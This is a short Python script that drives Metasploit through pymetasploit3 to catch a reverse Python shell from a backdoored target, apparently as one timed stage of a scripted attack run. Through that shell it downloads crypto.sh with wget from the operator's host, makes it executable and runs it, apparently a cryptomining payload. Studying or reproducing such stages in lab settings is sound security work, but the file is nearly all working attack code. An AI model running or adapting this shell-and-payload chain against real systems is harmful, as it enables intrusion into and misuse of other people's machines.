import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    # Retrieve control from backdoor
    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    payload['LHOST'] = my_ip

    time.sleep(2)
    output_time_file = 'time_stage_3_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    # print('Start 4')
    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    # print(client.sessions.list['4'])

    shell = client.sessions.session('4')
    shell.write('wget --no-check-certificate http://{0}/downloads/crypto.sh'.format(my_ip))
    shell.write('chmod 755 ./crypto.sh')
    shell.write('timeout 60s ./crypto.sh &')


main(sys.argv)
